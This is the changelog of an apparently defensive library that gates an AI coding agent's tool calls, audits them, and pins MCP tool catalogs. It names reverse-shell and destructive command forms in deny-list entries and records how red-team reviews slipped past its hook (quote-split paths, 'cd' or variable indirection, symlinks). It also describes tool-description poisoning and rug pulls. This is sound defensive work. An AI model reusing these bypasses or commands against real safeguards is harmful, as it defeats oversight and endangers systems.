- **Minimal environment is the default for `mcp pin`/`mcp verify`.** A server being
  pinned is by definition not yet trusted, so the full-shell-environment behavior is
  now the explicit, named opt-out (`--inherit-env`); `--minimal-env` remains accepted
  as the (now default) compatibility flag. The config's own `env` (expanded) and
  `CLAUDE_PROJECT_DIR` always ride along.

## [0.4.2] - 2026-07-12

The audit-integration release plus a hardening pass driven by a third external review,
which found (and live Windows validation confirmed) that the POSIX launcher fails OPEN
under Claude Code's documented PowerShell fallback, and that the shared-file audit
pattern was unsafe under Claude Code's documented parallel hook execution.

### Fixed
- **The gate no longer fails open on Windows without Git Bash (P0).** Claude Code runs
  shell-form hooks under Git Bash and falls back to PowerShell when it is absent, where
  the POSIX launcher is a parse error with exit 1 - a NON-blocking code, i.e. the gate
  silently disabled (live-verified). `recusal init` is now platform-aware: on Windows it
  registers a PowerShell-native launcher with an explicit `"shell": "powershell"`
  (PowerShell is always present; the explicit shell also keeps Git Bash from trying to
  parse it), POSIX elsewhere, `--launcher both` for a settings.json shared across OSes.
  The PowerShell launcher was validated end to end on a real Windows host: deny emits
  the JSON and exits 0, a broken gate and a missing interpreter each coerce to exit 2.
  `recusal doctor` now validates the registered launcher's shell strategy against the
  host instead of grepping for "exit 2"; the plugin's POSIX launcher is scoped honestly
  (macOS/Linux/Windows-with-Git-Bash) in its own manifest.
- **File-backed audit appends are one serialized transaction.** Claude Code runs hooks
  for parallel tool calls concurrently; two hook processes could read the same head and
  write sibling entries, forking the chain with neither append reporting an error. An
  append now holds an inter-process lock (`<path>.lock`), re-reads the chain head from
  the END of the file, writes, and only then commits in-memory state - so a failed write
  never advances the chain (previously state advanced before persistence). `fsync=True`
  opts into durability past the OS cache. Proven by a test that hammers one file from
  four real processes and verifies one gapless chain.
- **`resume="tail"` now actually recovers the head from the final record** (backward
  seek, corrupt-tail tolerant, full-scan fallback for pathological logs) instead of
  streaming the whole file - making it O(final record) in time as well as memory. The
  README's "flat per-call cost" claim was wrong for the old implementation and was
  corrected along with the code.
- **`verify` and `verify_file` return verdicts on garbage, never crash out of one.** A
  valid-JSON line that is not an object (`[]`, `null`, a string, a number) is a named
  verification failure instead of an uncaught exception; hash/seq/decision shapes are
  validated; unreadable files (permissions, a directory, invalid UTF-8) return a
  structured failure; and the CLI now routes through the same strict verifier instead of
  duplicating the logic (unreadable stays exit 2, broken chain stays exit 1).
- **The manifest cache cannot serve stale authorization.** The (mtime, size) signature
  missed a same-size, timestamp-preserved replacement - exactly how a REVOCATION might
  land via deployment tooling - and had a stat-then-open race. `manifest_policy` now
  reads the manifest bytes every call and reparses only when their SHA-256 changes;
  pinned with a test that revokes a tool under a preserved mtime and identical size.
- **The stdio observer bounds aggregate hostile input.** Bounded reader queue, a total
  character budget (`MAX_TOTAL_CHARS`) and an unrelated-message budget
  (`MAX_UNRELATED_MESSAGES`) across the observation; a non-object entry in `tools`
  refuses the whole catalog (silently filtering would certify a subset as the declared
  surface); JSON nested beyond parseable depth on the wire is an `McpFetchError`, not a
  RecursionError; `NaN`/`Infinity` are rejected as unparseable; `nextCursor` must be a
  bounded string.
- **The GitHub Action ref now selects the implementation unconditionally.** The install
  step force-installs the action ref's bundled source, replacing whatever is on the
  runner; `use-installed: "true"` is the explicit escape hatch for a deliberately
  preinstalled checkout (the dogfood job names it now). CI gained a provenance job that
  proves both the clean-runner install and that a deliberately conflicting preinstalled
  recusal gets replaced.
- **A null/empty/non-string `tool_name` is a malformed envelope**, failing closed before
  any policy is asked to reason about it.

### Added
- **`run_pretooluse_hook(audit=...)`: every adjudication on the record, one wire.**
  Pass an `AuditLog` and every hook decision - defer, allow, and deny alike - appends one
  hash-chained entry naming the tool, the decision, the reasons, and a SHA-256 fingerprint
  of the proposed `tool_input` (contents are never embedded: a `Write`'s file body or an
  env value must not leak into the log). `actor=` labels entries and defaults to the
  event's `session_id`. An unwritable log fails **closed** to a deny - the record is part
  of the control - unless `fail_closed=False`. Malformed-event and policy-error denials
  are on the record too, with synthesized findings saying what happened.
- **`AuditLog(path, resume="tail")`: resume the chain without holding the log in memory.**
  Recovers the chain head from the final record and retains no entries, before or after;
  appends go to disk only. The default `resume="full"` is unchanged. Tail is the right
  mode for a per-call hook over a growing log and for long-running gates; verify with
  `verify_file(path)`.
- Audit records carry `prompt_id` (transcript linkage, from the documented PreToolUse
  event; a `tool_use_id` is recorded defensively should the event ever include one), and
  `verify_file` takes the same `expected_head=` anchor as `verify`.

### Documentation
- Claims squared with implementation: "same evidence, same verdict, forever" is now
  "same evidence, same policy, same version, same verdict" (FAQ, CONSTITUTION); the
  Windows launcher scope is stated everywhere the launcher appears; prompt-time `@file`
  references are named as outside PreToolUse (SECURITY.md); and the audit docs state
  plainly that finding messages are plaintext record content - keep secrets out of
  messages.

## [0.4.1] - 2026-07-12

Hardening and documentation only, driven by two external reviews; no new capabilities.

### Added
- **`fetch_tools_stdio(minimal_env=True)` and `recusal mcp pin/verify --minimal-env`.**
  By default the spawned server inherits the full parent environment (matching how Claude
  Code launches the same server). A server being *pinned* is by definition not yet
  trusted, so `minimal_env=True` hands it only what a process needs to launch (PATH and
  friends) plus explicitly passed `env` - an API key in your shell does not ride along.

### Fixed
- **`verify_file` is a strict verifier: a malformed nonblank line is a failure, not a
  skip.** `load()` tolerantly skips a corrupt line (a half-written tail must not brick a
  *reader*), and `verify_file` verified only what `load()` kept, so a log whose newest
  records were garbage could read as intact; the CLI already refused this, the library
  helper now matches it. A missing file is a failure too (a missing log is not an intact
  log), and `verify_file` now takes the same `expected_head=` anchor as `verify`.
- **The GitHub Action's ref now selects the implementation that runs.** The install step
  defaulted to "latest from PyPI" when recusal was not already importable, so
  `uses: philpaz/recusal@vX` could execute a *later* release than the pinned action. The
  default now installs the package bundled with the selected action ref
  (`$GITHUB_ACTION_PATH`); an explicit `version:` input remains as the one deliberate
  override, and a job that pre-installed a checkout keeps it.
- **The stdio fetcher treats `initialize` negotiation as binding.** The response's
  `protocolVersion` must be one this client speaks (`SUPPORTED_PROTOCOL_VERSIONS`:
  2025-11-25 through 2024-11-05; the newest is now requested), the server must return a
  capabilities object, and it must advertise the `tools` capability - each failure is a
  refusal, not a shrug-and-proceed.
- **The declaration screen returns a verdict on hostile nesting instead of crashing.**
  A ~3000-deep `inputSchema` blew the recursion limit inside `screen_tool_declarations`,
  so `recusal mcp pin` died with a RecursionError traceback - fail-closed by accident,
  but a crash is not a verdict. The walk is iterative now, and nesting past
  `MAX_DECLARED_DEPTH` (200) is itself an ERROR finding (`mcp_declaration_depth`): too
  deep to plausibly review gets the same treatment as too long. Depth beyond what
  canonical JSON can serialize now fails closed (exit 2) in `pin`/`verify` as well.
- **The stdio reader bounds a single line (`MAX_LINE_CHARS`).** A server emitting one
  endless line with no newline buffered unboundedly until the timeout; it now refuses
  with a truthful "runaway stream" error.
- **String `passed` values now fail closed on unrecognized tokens, matching `status`.**
  `Finding.coerce` read a string `passed` against a false-token blocklist, so an
  unrecognized token (`"passed": "maybe"`) coerced to PASS while `"status": "maybe"`
  failed closed. Both fields now share the allowlist posture: a string counts as a pass
  only when it is an affirmative token (`"true"`/`"yes"`/`"1"`/`"pass"`/...); anything
  unrecognized reads as a failure. Genuine booleans and numbers are unchanged.

### Changed
- **`manifest_policy` caches the pinned names, keyed by the manifest file's
  (mtime, size).** An unchanged manifest costs a `stat` plus a set lookup per call
  instead of a read+parse+validate; a re-pin is picked up live, a deleted or corrupted
  manifest still fails closed (the stale pin is never served past its file).
- **The MCP control plane is protected by default.** `.mcp.json` decides which server
  processes launch and `mcp-manifest.json` is what "approved" means at call time, so both
  join the deny-list's default protected paths (kill-switch rank); cookbook recipe 13 now
  composes `manifest_policy` over `deny_list_policy()` so the pin protects its own files.
- **Releases prove the release commit.** `release.yml` runs the full gate (ruff, format,
  mypy, pytest) at the exact release commit before anything builds or publishes, and every
  third-party action in CI and release workflows is pinned to an immutable commit SHA (a
  moving tag is a rug-pull surface). mypy now type-checks against Python 3.9, the declared
  minimum, instead of 3.10.

### Documentation
- **The launch-identity boundary is named everywhere it matters.** Observing a stdio
  catalog *executes the command the config declares*, and the manifest pins the declared
  catalog, not the identity of the process that declares it - a rewritten `.mcp.json`
  runs at observe time, before its catalog can fail verification. README, SECURITY.md,
  the cookbook, the module docstrings, and the `--stdio`/`--claude-config` CLI help all
  now say so plainly ("treat the config as executable code"); pinning launch
  specifications (manifest v2) is a named roadmap item, not shipped.
- **Claims tightened to what the implementation proves.** "The agent could not subvert
  it" is restated as: within a correctly registered routed tool channel, an unapproved
  capability is refused by default rather than inferred safe. "Closes the discovery
  boundary" becomes "adds deterministic integrity controls at the discovery boundary".
  Cookbook recipe 15 is "the three-boundary MCP governance pattern", not "the full MCP
  governance stack". "Independent" is defined once in the README: the verdict is produced
  outside the model's decision path; deployment isolation remains the adopter's
  responsibility. And read-only is stated as *nonmutating*, not confidentiality-safe: the
  default-safe tools can still read credentials, so add path/subject-level read rules
  where confidentiality matters.
- The `_SHELL_META` comment in the Claude Code allowlist now states the actual posture:
  glob (`*`, `?`, `[`) and tilde expansion are accepted for allowlisted read-only
  binaries (any literal path is equally readable by design, and expansion can never
  select the binary itself, since argv[0] must literally match the allowlist); the
  metacharacter set refuses chaining, substitution, redirection, and escapes. Pinned
  with tests in both directions.

## [0.4.0] - 2026-07-10

### Added
- **MCP discovery governance (`recusal.mcp`): pin the tool catalog, refuse the rug pull.**
  The model chooses tools by reading their declared descriptions, so the discovery
  boundary (`tools/list`) is where a poisoned description or a post-approval definition
  change steers the agent before any call exists for a call-time policy to see. This
  release closes that boundary the way the library closes every boundary: deterministic
  evidence through the same kernel, with the human where the judgment is.
  - **The kernel**: `build_manifest` pins a reviewed catalog to a deterministic manifest
    (SHA-256 fingerprints over canonical JSON, byte-exact, no unicode normalization, so a
    homoglyph swap IS a change; hashes only, a poisoned description is never embedded;
    no timestamp inside, *when* belongs to the audit log). `diff_manifest` emits Findings:
    an unpinned server or tool and a changed declaration (the changed fields are named;
    a changed *description* is called out as the rug-pull vector) are CRITICAL; a removed
    tool or absent server is a recorded WARNING; an empty or ambiguous observation fails
    closed. `screen_tool_declarations` is a pin-time review aid (deterministic injection
    markers + a size cap over the *whole* declaration - title, annotations, schema property
    names/descriptions, enum values - ERROR → RETRY → a human looks), deliberately not a
    malice detector: whether a declaration is malicious is semantic judgment, made by the
    human at pin time; everything after the pin detects *change*, not *intent*.
  - **CLI**: `recusal mcp pin` / `recusal mcp verify`, same exit-code discipline as the
    other CI commands (0 clean, 1 needs-review, 2 refused/drift/operational error). The
    pin fails toward refusal three ways: an incomplete observation refuses, a flagged
    description screen refuses to write until `--force` records human review, and
    replacing a differing manifest refuses without `--update`. Sources: a live stdio
    server (`--stdio NAME COMMAND`), every stdio server in a Claude Code `.mcp.json`
    (`--claude-config`, URL-based servers are surfaced as unfetchable, never silently
    dropped), or a JSON dump (`--from`, the escape hatch for HTTP servers).
  - **Call-time enforcement**: `manifest_policy("mcp-manifest.json")` drops into the same
    `PreToolUse` gate and refuses any `mcp__server__tool` call that was never pinned
    ("no pin, no MCP"); a missing or corrupt manifest fails CLOSED for MCP calls; wraps
    an inner policy so argument-level rules compose on top of the pin.
  - **The fetcher** (`recusal.mcp_fetch`, a separate module - the one place in the package
    that spawns a process, kept apart so the decision surface stays pure/stdlib): a minimal
    zero-dependency stdio MCP client (`fetch_tools_stdio`, newline-delimited JSON-RPC,
    `initialize` → `notifications/initialized` → paginated `tools/list`). Collection is
    never decision; every irregularity (timeout, early exit, JSON-RPC error, unparseable
    line, invalid UTF-8) raises so a failed observation can never read as an empty,
    clean-looking catalog.
  - **Proof**: `examples/mcp_manifest_rugpull.py` (offline demo: pin → rug pull → FAIL →
    unpinned call refused) and 73 new tests across `tests/test_mcp_manifest.py`,
    `test_mcp_policy_bridge.py`, `test_mcp_fetch.py` (a real fake-server subprocess:
    pagination, notifications, stderr noise, timeout, early exit, invalid UTF-8), and
    `test_mcp_cli.py`.
  - **What this does and does not do (honest scope).** It governs *discovery-time* and
    *call-time*: `verify` proves the catalog at the moment it runs (wire it into CI and
    session start), and `manifest_policy` enforces approved-tools-only on each call by
    name. It is **not** a live tap on every message: a server that serves a clean catalog
    to `verify` and a poisoned one to the live session (a client- or time-discriminating
    server) is a residual this layer names, not one it closes. The description screen is a
    **deny-list** review aid with a deny-list's ceiling (known injection phrasing across
    the whole declaration, not just `description`), not a malice detector. MCP's flat
    `mcp__server__tool` runtime naming means a pinned tool whose name contains `__` shares
    a runtime string with another split; pinning one authorizes either (inherent, not
    removable at this layer). Transport/authorization threats (confused deputy, token
    passthrough, session hijacking) remain the MCP spec's own Security Best Practices layer.
  - **Pre-release hardening** (two independent audits, correctness + adversarial): `verify`
    fails closed (not an uncaught traceback) on an uncanonicalizable string; the manifest
    validator rejects a non-object `fields` entry before `diff` dereferences it; a pinned
    server silently swapped to a URL transport is a CRITICAL refusal (not a WARNING that
    passes); `--json` output is always valid JSON on every branch (notes and prose no
    longer interleave with the payload); a server observed with zero tools is a shrunk set
    (WARNING), consistent with `build_manifest`, not conflated with a failed fetch; a
    `--from` mapping whose server is literally named `tools` no longer drops its siblings
    (mode is chosen by `--server`); invalid UTF-8 from a server surfaces a truthful error
    instead of "server exited"; the manifest write is atomic; the fetch caps tool count;
    and a killed child is reaped.
- **MCP tool governance at the call boundary, documented and pinned.** MCP server tools reach Claude Code's
  `PreToolUse` hook as ordinary tools named `mcp__<server>__<tool>`, so the existing
  `policy(tool_name, tool_input)` seam and the `.*` matcher already govern MCP calls with
  no MCP-specific adapter; this makes that capability explicit instead of implied.
  - README section **"MCP tools, the same gate"**, including the three-boundary model
    (discovery / invocation / response) with today's coverage stated honestly: invocation
    is this gate, response is the injection-quarantine recipe, discovery (tool-description
    poisoning, manifest/schema drift) is named as a boundary Recusal does not collect
    evidence for yet.
  - `examples/mcp_governance.py`: runnable demo and real hook (`--hook`) with
    approved-server pinning, destructive-verb refusal, repo scope, write-path confinement,
    and allowlist mode (an MCP tool is refused unless affirmatively named).
  - `tests/test_mcp_governance.py`: pins the claims, deny/defer at the `decide` seam, a
    real `PreToolUse` event carrying an `mcp__` name end to end, allowlist default-deny
    for MCP, and fail-closed on a buggy policy adjudicating an MCP event.
  - Cookbook recipe 12 (**Govern MCP tool calls**) and two verified sources in
    `docs/REFERENCES.md` (Claude Code hooks reference; MCP spec *Security Best Practices*,
    noting its authorization/transport scope is complementary, not overlapping).

## [0.3.0] - 2026-07-08

### Added
- **CI adjudication commands.** The `recusal` CLI grew three subcommands that expose the
  kernel to CI with blocking exit codes (`PASS` → 0, `RETRY` → 1, `FAIL` → 2; every
  operational error - unreadable file, invalid JSON, malformed anchor - exits 2,
  indistinguishable from FAIL on purpose: a gate that cannot adjudicate must refuse, not
  wave the job through). All three take `--json` for a stable machine-readable payload.
  - **`recusal verdict findings.json`**: adjudicate any tool's findings file (a JSON array,
    or an object with a `findings` array; `-` reads stdin). Strict by default - a finding
    that omits `status`/`passed` is rejected rather than read as a silent pass
    (`--lenient` opts out) - and an *empty* findings set fails closed: an evidence set
    that proves nothing certifies nothing (the `GateAdjudicator` rule, at the CLI seam).
  - **`recusal audit verify log.jsonl [--expect-head COUNT:HASH]`**: verify a hash-chained
    audit log. A **missing log fails closed** (a missing log is not an intact log), and a
    nonblank line that does not parse counts as a *break*: `recusal.audit.load` skips such
    a line so a reader survives a half-written tail, but a verifier that ignored it could
    bless a log whose most recent entries are unreadable.
  - **`recusal doctor [--dir]`**: health-check a scaffolded gate - gate script present and
    compiling, hook actually registered in `settings.json`, launcher coercing failures to
    the blocking exit code - so "the gate silently isn't installed" is caught by CI
    instead of discovered during an incident. The doctor is adjudicated by the same kernel
    it checks: its observations are `Finding`s folded through `compute_verdict`.
- **GitHub Action** (`action.yml`): the same three commands as a composite action
  (`uses: philpaz/recusal@v0.3.0`), so a refusal blocks a merge, not just a tool call.
  Inputs flow through `env`, never interpolated into the shell body (no injection seam);
  given nothing to adjudicate it exits 2 rather than pass vacuously. Dogfooded by this
  repository's own CI, including the negative case: a tampered audit log must make the
  gate refuse (`tests/test_cli.py` drift-locks all of these properties).
- `recusal --version`.

## [0.2.0] - 2026-07-07

### Added
- **`python -m recusal init`** (also installed as the `recusal` console script): one-command
  scaffolding of the Claude Code gate. Writes `.claude/hooks/recusal_gate.py` (a thin shim
  over the shipped `deny_list_policy()`; `--posture allowlist` emits the default-deny
  variant with `--writable-root`) and registers the fail-closed interpreter-probing
  launcher in `.claude/settings.json`. Fail-safe by construction, pinned by tests: an
  existing gate file is never overwritten, an existing `settings.json` is merged (never
  clobbered) and left byte-for-byte untouched if it does not parse, and re-running is a
  no-op. A drift-lock test asserts the emitted launcher stays byte-identical to the one
  this repository registers for itself in `.claude/settings.json.example`.
- **Claude Code plugin (`recusal-gate`)**: the repo is now a plugin marketplace
  (`.claude-plugin/marketplace.json` + `claude-plugin/`), so the gate installs user-wide with
  `claude plugin marketplace add philpaz/recusal && claude plugin install recusal-gate@recusal`.
  The plugin wires the same deny-list shim through the same fail-closed launcher (drift-locked
  to the canonical command by `tests/test_claude_plugin.py`); if the `recusal` package is not
  pip-installed it refuses every tool call rather than silently disabling itself. Verified
  live: a marketplace-installed plugin refused `rm -rf` in a session running under
  `--dangerously-skip-permissions`.
- **README demo GIF** rendered from two verbatim transcripts: a live Claude Code session in
  which the dogfooded hook refuses `rm -rf` under `--dangerously-skip-permissions`, and the
  offline `examples/claude_refusal.py` run.

## [0.1.3] - 2026-07-06

### Added
- **`recusal.deny_list`**: the reference deny-list engine, extracted from the dogfood hook
  into an importable, versioned, unit-tested module. `deny_list_policy(...)` builds the
  hardened policy (destructive shell, secret writes, kill-switch edits/deletes, with
  de-obfuscation, pipe-into-any-interpreter, reverse-shell, `cd`/variable-indirection, and
  best-effort symlink coverage) and takes `protected_paths=` / `secret_basenames=` /
  `command_keys=` / `read_only_tools=` so adopters can point it at their own gate;
  `analyze_command(...)` exposes the command adjudicator as a pure function.

### Changed
- `.claude/hooks/recusal_gate.py` is now a thin shim over `recusal.deny_list.deny_list_policy()`,
  so a fix to the deny-list ships through `pip install -U` instead of a copy-paste, and the
  security logic is covered as a package unit (`tests/test_deny_list.py`) in addition to the
  end-to-end dogfood test that still loads the real hook.

## [0.1.2] - 2026-07-06

### Security
- **Fail-closed on a `status` failure token (HIGH).** `Finding.coerce` read the `status`
  field against a hardcoded `{"fail","error","warn"}` blocklist, so a CRITICAL finding with
  `status` of `"failed"`, `"false"`, `"0"`, `"no"`, `"denied"`, `"fatal"`, … coerced to
  **PASS**, even under `strict=True`, and passed through every enforcement adapter as
  allow/defer. This was the exact `bool("false")==True` silent-pass this library exists to
  prevent, on the `status` path. The field is now read against a pass **allowlist**: any
  token not affirmatively passing (`pass`/`passed`/`ok`/…) fails closed.
- **Empty gate evidence no longer passes vacuously (MED).** `GateAdjudicator.adjudicate`
  with an empty findings set returned a PASS, letting a gate that proved nothing count
  toward `release_ready`. It is now a CRITICAL `evidence_error`, matching the module's
  "absence of evidence is not a pass" contract.
- **Dogfood hook: closed a self-protection bypass and enumeration gaps.** `cd .claude && rm
  settings.json` (and variable-indirected `d=.claude; rm $d/settings.json`) split the
  protected path across the `&&`, so the contiguous-substring self-protect never matched;
  a `cd`/`pushd` into, or variable binding of, a control dir plus a write verb is now
  refused. Added `php -r` / `lua -e` / `Rscript -e` / `groovy`/`elixir` inline-exec forms to
  the kill-switch write guard, and caught the spaced form of the classic fork bomb.

### Fixed
- Audit-log claims corrected across README, SECURITY, HOWTO, WHY, CHANGELOG, and the module
  docstrings: an in-place edit is caught only for an entry that still has an untampered
  successor; a tail-suffix rewrite (down to the last entry) and a forged append pass
  unanchored `verify` and need the `expected_head` anchor. Pinned by a new regression test.
- Purged em/en-dashes from all shipped files (regressed in the 0.1.1 copy pass).

## [0.1.1] - 2026-07-06

### Security
- **Allowlist default hardened.** Removed `pytest`, `mypy`, `rg` (and `ruff`) from
  `DEFAULT_SAFE_BINARIES`: each executes arbitrary code through an argument (pytest imports
  `conftest.py`, mypy loads plugins, rg `--pre` spawns a command), which reopened the
  write-a-script-then-run-it bypass allowlist mode exists to close. The default set is now
  read/inspect tools only; any binary you add must be safe under every argument. COOKBOOK
  recipe 11 and `examples/allowlist_gate.py` updated to match.
- **Dogfood hook self-protection widened.** Closed fail-open gaps where inline-interpreter
  code (`py -c`, `python3.12 -c`, `node --eval`, `deno`/`bun eval`) or a slash-decorated
  control-directory move (`mv ./recusal`, `mv .claude/`) could edit/move the gate's own
  package or config and defer. `writable_root` now resolves symlinks (no escape via an
  in-root link). `sed -n` reads no longer false-positive (only `sed -i` writes are refused).
- **ReDoS fixed** in path normalization (trailing-dot stripping is now linear, not
  quadratic); the `[IO.File]::Write*` pattern quantifier is bounded.

### Changed
- Docs frame deny-list vs allowlist as two paths chosen by channel (no ranking); the
  reference architecture dogfoods the deny-list path, with the rationale stated.

## [0.1.0] - 2026-07-02

### Added
- **Evidence contract**: `Finding`, `Verdict`, `Severity`, `Decision`, and
  `compute_verdict` (the typed, zero-dependency spine). See `docs/EVIDENCE.md`.
- **Built-in checks**: `row_count`, `null_rate`, `referential_integrity`, `in_set`,
  `in_range`, `required_keys` (operate on any dict-like rows; no pandas required).
- **`GateAdjudicator`**: staged `G0`-`G8` release checkpoints and a release-evidence rollup.
  Each gate is `compute_verdict` applied at a checkpoint, returning a typed `GateResult`
  (wrapping a `Verdict`); `release(...)` rolls them into a `ReleaseEvidence`. Domain-neutral,
  gates are pure `(id, description)` labels you can replace, and the rollup is a pure
  function of the findings (no timestamps, no nondeterminism), so it replays and compares
  exactly. One decision function across the whole library.
- **Claude adapters**: `recusal.claude` (manual-loop tool gate + Managed Agents
  confirmation) and `recusal.claude_code` (a `PreToolUse` hook that denies even under
  `bypassPermissions` and fails closed on a policy error).
- **Allowlist mode as library API**: `recusal.claude_code.allowlist_policy`, a
  default-deny policy factory (nothing runs unless affirmatively named: vetted first
  binaries only, no shell metacharacters, **bare interpreters refused** so
  `python script.py` cannot execute unvetted code, writes scoped to a `writable_root`,
  per-tool `allow` predicates). Closes the write-a-script-then-run-it bypass a deny-list
  cannot see; pinned in `tests/test_claude_code_allowlist.py`. The docs now carry
  **two-tier claim language**: a deny-list "raises the cost / stops the common cases";
  only allowlist mode earns "the agent could not subvert it," scoped to the routed tool
  channel (HOWTO §1, README, SECURITY, FAQ).
- **Tamper-evident audit log**: `recusal.audit` (`AuditLog`, `verify`): a hash-chained,
  append-only JSONL record of every verdict; an edit or reorder of any entry with a
  surviving successor is detected, and tail truncation, tail-suffix rewrite, or a forged
  append are caught with the `expected_head` anchor. Maps to OWASP Agentic logging / EU AI
  Act Article 12 (record-keeping).
- **Deterministic failure classifier**: `recusal.classify` (`classify_failure`,
  `classify_verdict`): routes a failure to a class + remediation channel (policy_violation,
  prompt_injection, transient, code_bug, data_shape, data_missing, spec_ambiguity)
  by explicit markers; extensible taxonomy, never guesses.
- **Dogfood**: Recusal governs its own repository via a real Claude Code hook; verbatim,
  reproducible, CI-locked proof in `docs/PROVEN.md`.
- **Examples**: offline refusal demo, live Claude-agent demo, an OWASP-mapped scenario
  gallery, a Claude Code hook, an audit-log demo, and a **framework-neutral agent loop**
  (`examples/agent_loop.py`) whose only import is `recusal`, proof the zero-dep core gates
  any loop with no Claude and no SDK.
- **Docs**: `CONSTITUTION`, `docs/WHY`, `docs/EVIDENCE`, `docs/HOWTO`, `docs/EXTENDING`,
  `docs/LANDSCAPE`, `docs/PROVEN`, a `docs/FAQ` (adoption objections answered), a
  `docs/COOKBOOK` (copy-paste policies for the common gated actions), and a `docs/README`
  documentation index.
- **Community files**: `CODE_OF_CONDUCT` (Contributor Covenant), GitHub issue templates
  (bug / feature) and PR template under `.github/`, and enriched package metadata
  (`project.urls`, `Typing :: Typed`).
- **Tooling**: zero runtime dependencies; ruff (lint + format), mypy, pytest, and
  pre-commit, all run in CI; a `release.yml` workflow that builds and publishes to PyPI via
  Trusted Publishing (OIDC) on a GitHub Release.

### Security & hardening
- The Claude Code hook **fails closed on a malformed/non-object event**, not just a policy
  exception (previously a garbled event deferred, i.e. failed open).
- `compute_verdict(..., strict=True)` / `Finding.coerce(..., strict=True)` reject a loose
  evidence dict that omits an explicit `status`/`passed` instead of treating it as a pass.
- `recusal.audit`: precise tamper model (tamper-evident, not tamper-proof);
  `verify(..., expected_head=(count, last_hash))` catches truncation and a full-chain rewrite;
  resume tolerates a corrupt trailing line; `default=str` so a verdict is never dropped.
- `recusal.classify`: tightened over-broad default markers (no longer mis-escalates benign
  validation errors to `refuse`, or numeric substrings to `retry`); non-string input is
  coerced; `classify_verdict` returns `pass -> proceed` on a PASS.
- `GateAdjudicator`: a release is not "ready" with empty or missing gate evidence.
- The dogfood hook protects its own settings/hook from being disabled, normalizes commands,
  and matches `rm` recursive-force in any flag order; example/cookbook path checks use
  `os.path.commonpath` (the `startswith` prefix bypass is fixed).
- **Dogfood hook, red-team hardening pass** (closes bypasses found in a full adversarial
  review, each pinned as a regression test in `tests/test_dogfood_redteam.py`):
  self-protection now covers *removal* of the kill-switch (`rm`/`mv`/`del` of the hook or
  settings), not just edits; secret and self-protect checks run against the de-obfuscated
  command and three path readings, so a quote-split (`.cla""ude`), a backslash-escape
  (`.cl\aude`), or a Windows separator can no longer hide a protected path; piping into
  *any* interpreter (`python`/`perl`/`ruby`/`node`/`php`/`pwsh`), not just `sh`/`bash`, is
  refused; recursive `rm` is refused even without `-f`; `git clean -f`, `git checkout --`,
  `find -exec rm`, `unlink`, and reverse/bind shells (`/dev/tcp`, `nc -e`) are refused;
  `prod.env`-style secret files are protected. A false-positive guard test keeps reads
  (`cat`/`grep`) and running the hook (`python file.py`) deferring, so the gate stays usable.
  Coverage is no longer Bash-only: any tool carrying a command under `command`/`cmd`/
  `shell`/`script` (an MCP shell) gets the same analysis, and a generic kill-switch guard
  refuses any non-read tool (an MCP filesystem tool) that targets a protected control path;
  `git config core.hooksPath` and `.git/hooks/**` writes (code-exec-on-commit vectors) are
  refused. Remaining limits are documented explicitly in `SECURITY.md`: network egress
  (an allowlist recipe, not the baseline hook), symlink/TOCTOU (closed for tool-based writes
  by the realpath layer below; `Bash` fragments stay string-matched), and runtime-constructed
  command names (the deny-list ceiling).
- **Subversion test library + second red-team pass** (`tests/test_subversion_*.py`, ~170
  adversarial cases across kernel, adapters, audit, hook, and classifier). New fixes it drove:
  `Finding.coerce` reads a stringified `"passed": "false"`/`"no"`/`"0"` as a *failure* instead
  of trusting raw truthiness (a `bool("false")` is `True`), closing a silent-pass footgun at
  the loose-dict boundary; the dogfood hook now matches command-carrying keys
  **case-insensitively and at any nesting depth** and joins **argv-array** command values
  (so `"Command"`, `{"payload": {"command": ...}}`, and `["rm","-rf","/"]` can't smuggle a
  shell past); and `socat EXEC:`/`SYSTEM:` reverse shells are refused. The suite also *pins*
  the honest deny-list limits as expected-defer tests (runtime-constructed names, interpreter
  code) so the boundary is a tested fact, not a footnote.
- **Best-effort `realpath` layer for tool-based writes** (closes the innocent-name TOCTOU):
  a `Write`/`Edit` or MCP filesystem write whose path resolves through a symlink onto a
  protected control path is refused (`_resolves_into_protected`), so `notes.txt` ->
  `.claude/settings.json` is caught even though the path string carries no protected segment.
  A not-yet-created link and `Bash` string fragments remain out of scope by design (an
  allowlist is the real defense).
- **Symlink resolution now covers a bare filename on the MCP path** (found by running the
  subversion suite in an environment that grants symlink privilege, where the case was live
  rather than skipped): the generic kill-switch guard used to symlink-resolve only strings
  containing a path separator, so a bare innocent-named link (`notes.txt` with no `/`) slipped
  through as `defer` on an MCP filesystem tool while `Write` correctly denied it. The two
  write paths now refuse the identical link. Pinned by two new tests in
  `tests/test_subversion_hook.py` (the deny plus a bare-name false-positive guard).

_0.1.0 is the first published release (on PyPI). Unreleased changes will be listed here._
